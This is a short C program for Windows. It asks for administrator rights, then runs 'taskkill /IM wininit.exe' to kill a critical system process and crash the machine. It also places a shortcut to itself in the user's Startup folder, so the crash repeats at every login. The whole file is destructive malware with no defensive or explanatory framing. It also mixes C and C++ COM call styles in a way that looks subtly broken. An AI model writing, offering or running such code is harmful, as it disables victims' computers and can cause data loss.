#include <windows.h>
#include <stdio.h>
#include <shlobj.h>  // For SHGetFolderPath

int main() {
    // Request administrator privileges if not already running as Administrator
    BOOL isAdmin = FALSE;
    PSID administratorsGroup;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

    // Initialize SID for the Administrators group
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup)) {
        CheckTokenMembership(NULL, administratorsGroup, &isAdmin);
        FreeSid(administratorsGroup);
    }

    if (!isAdmin) {
        printf("Not running as Administrator. Requesting permission...\n");

        SHELLEXECUTEINFO sei = {0};
        sei.cbSize = sizeof(sei);
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        sei.hwnd = NULL;
        sei.lpVerb = "runas";  // Request elevation
        sei.lpFile = "cmd.exe";
        sei.lpParameters = "/c taskkill /IM wininit.exe";  // Taskkill command
        sei.nShow = SW_SHOWNORMAL;

        // Execute with elevated privileges
        if (!ShellExecuteEx(&sei)) {
            printf("Error requesting admin privileges.\n");
            return 1;
        }

        // Wait for process to finish
        WaitForSingleObject(sei.hProcess, INFINITE);
        CloseHandle(sei.hProcess);
    } else {
        // Execute the taskkill command directly
        system("taskkill /IM wininit.exe");
    }

    // Add program to the Startup folder
    char szPath[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, szPath) == S_OK) {
        // Get the current executable path
        char exePath[MAX_PATH];
        GetModuleFileName(NULL, exePath, MAX_PATH);
        
        // Create a shortcut in the Startup folder
        strcat(szPath, "\\MyProgram.lnk");
        HRESULT hRes;
        IShellLink* psl;

        hRes = CoInitialize(NULL);
        if (SUCCEEDED(hRes)) {
            hRes = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (LPVOID*)&psl);
            if (SUCCEEDED(hRes)) {
                psl->SetPath(exePath);
                psl->SetArguments("");
                IPersistFile* ppf;
                hRes = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);
                if (SUCCEEDED(hRes)) {
                    hRes = ppf->Save(szPath, TRUE);
                    ppf->Release();
                }
                psl->Release();
            }
            CoUninitialize();
        }
    }

    return 0;
}
